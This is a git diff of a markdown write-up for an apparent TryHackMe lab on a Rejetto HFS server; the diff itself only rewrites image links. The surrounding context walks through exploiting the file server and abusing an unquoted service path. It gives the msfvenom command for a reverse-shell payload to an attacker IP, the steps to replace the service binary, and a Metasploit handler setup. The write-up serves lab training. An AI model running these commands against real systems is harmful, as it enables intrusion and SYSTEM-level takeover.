@@ -10,15 +10,15 @@ Who is the employee of the month? **Bill Harper**
 
 Let's perform a quick nmap scan.
 Results:
-![[images/20230912104926.png]]
+![](images/20230912104926.png)
 From our scan we can see that port 80 is open and can deduct that it is a website so lets visit the site and see what's waiting for us.
 
 
-![[images/20230912192922.png]]
+![](images/20230912192922.png)
 
 Here we have a website displaying the Employee of the month. But what we need is the name of the employee of the month so lets try and get that. We can start by viewing the page source code or using the inspect element to see the name of the image.
 
-![[images/20230912193142.png]]
+![](images/20230912193142.png)
 
 From the source code we can see that the name of the image is "Bill Harper" which is the answer we are looking for.
 
@@ -27,7 +27,7 @@ From our nmap scan above we can see port 8080 is open and running a http server.
 
 Take a look at the other web server. What file server is running? Rejetto Http File Server
 
-![[images/20230912200320.png]]
+![](images/20230912200320.png)
 
 ![[images/20230912200338.png]]
 
@@ -109,7 +109,7 @@ This will then enumerate and print out results.
 
 The one we are interested in it the one with the "CanRestart"  option set to True, which indicates that our current user has permissions to restart that service.
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913100109.png]]
+![](images/20230913100109.png)
 As we can see from the image above we have a modifiable path and write permissions to that directory. This means we can replace the ASCService.exe file there with our maliciously crafted payload using msfvenom.
 
 Next we craft our payload from our attack machine using msfvenom and name it the same name as the AdvanceSystemCareService executable which is ASCService.exe:
@@ -117,20 +117,20 @@ Next we craft our payload from our attack machine using msfvenom and name it the
 msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
 ```
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913100821.png]]
+![](images/20230913100821.png)
 
 
 So the next step for us is to stop the AdvancedSytemCareService9 from running so that we can upload our malicious executable and replace it with the legitimate one.
 ```powershell
 Stop-Service -Name "AdvacnedSystemCareService9"
 ```
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913101110.png]]
+![](images/20230913101110.png)
 
 Now let's go back to our meterpreter shell to upload the payload to our target
 ```shell
 upload /path/to/payload
 ```
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913101225.png]]
+![](images/20230913101225.png)
 
 Before we execute our payload by starting the service again, we need to first setup a multi handler to catch our new shell as `NT Authority\System`. To do that we first background our current meterpreter shell using CTRL + Z and use the multi handler:
 
@@ -146,13 +146,13 @@ set LHOST <IP>
 set LPORT <PORT>
 ```
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913101929.png]]
+![](images/20230913101929.png)
 now we run the exploit as a job so that it will run in the background and enter into our previous meterpreter session:
 ```shell
 exploit -j
 ```
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913102154.png]]
+![](images/20230913102154.png)
 
 Now we enter back into the powershell and can now start the AdvancedSystemCareService9 and it'll execute our malicious payload executable rather than the legitimate service since we have already overwritten it.
 
@@ -160,15 +160,15 @@ Now we enter back into the powershell and can now start the AdvancedSystemCareSe
 Start-Service -Name "AdvanceSystemCareService9"
 ```
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913102705.png]]
+![](images/20230913102705.png)
 As we can see from the image above it has created a new shell for us which is going to a an `NT Authority\System` level shell. Let's take a look.
 We first background our current shell and enter into the new shell.
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913103418.png]]
+![](images/20230913103418.png)
 
 Bingo!.
 
 Now to find the flag. It'll most probably be in the Administrator's Desktop.
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913103752.png]]
+![](images/20230913103752.png)
 # Access and Escalation without Metasploit
 Now let's complete the room without the use of Metasploit.
 
@@ -190,7 +190,7 @@ Congratulations, we're now onto the system. Now we can pull winPEAS to the syste
 
 Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913104012.png]]
+![](images/20230913104012.png)
 
 What powershell -c command could we run to manually find out the service name?
 *Format is "powershell -c "command here"*
@@ -222,14 +222,14 @@ Let's begin!
 
 After getting the exploit let's configure it with the appropriate settings as indicated in the exploit. First is the IP address of our attack machine and port number we want to listen on to get the shell.
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913135614.png]]
+![](images/20230913135614.png)
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913140136.png]]
+![](images/20230913140136.png)
 Take note of the this statement. We will need to run a python server on port 80 in the same directory as our netcat [binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) file.
 
 Next step is to start a python server in the directory as our netcat binary. When the exploit is ran it will need a server hosting the file in order to transfer it to the target machine. We will then run the exploit a second time to execute the file and gain a shell once our netcat listener is set to that the specified port 4443 in order catch the shell.
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913141304.png]]
+![](images/20230913141304.png)
 Next step is to transfer a winPEAS script to autotmate our Privilege Escalation Enumeration and then run the script.
 
 Command to transfer the script form our attack machine to our target machine:
@@ -241,12 +241,12 @@ Command to execute the script:
 .\winPEASx64.exe
 ```
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913141953.png]]
+![](images/20230913141953.png)
 
 Now lets take a look at our winPEAS scan. We can see that there is an Unquoted service path  that we have write access to `C:\Program Files (x86)\IObit\Advanced SystemCare\`.
 In that directory there is a service executable "ASCService.exe" that we can abuse by replacing this with a malicious file which will give us a reverse shell.
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913142635.png]]
+![](images/20230913142635.png)
  All we need to do is to create a windows reverse shell payload  using msfvenom and save it into a file with the same name as the service "ASSCService.exe". Then in order to upload and replace the legitimate file with our malicious payload file we need to first of all stop the **AdvancedSystemCareService9** service, then upload our payload into the same directory in order to overwrite the existing file.
 
 Let's first create our payload:
@@ -254,7 +254,7 @@ Let's first create our payload:
 msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
 ```
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913100821.png]]
+![](images/20230913100821.png)
  Now lets stop the **AdvancedSystemCareService9**:
 ```shell
 powershell -c "Stop-Service -Name 'AdvancedSystemCareService9' -Force"
@@ -277,10 +277,8 @@ powershell -c "Start-Service -Name 'AdvancedSystemCareService9'"
 
 and bingo! we have a shell.
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913144245.png]]
+![](images/20230913144245.png)
 
-![[Website/Posts/TryHackMe_Writeups/Writeups/images/20230913144315.png]]
+![](images/20230913144315.png)
 
-![](Website/Posts/TryHackMe_Writeups/Writeups/images/20230904204608.png)
 
-![image1](https://github.com/deusx7/deusx7.github.io/blob/main/assets/images/20230905211643.png)
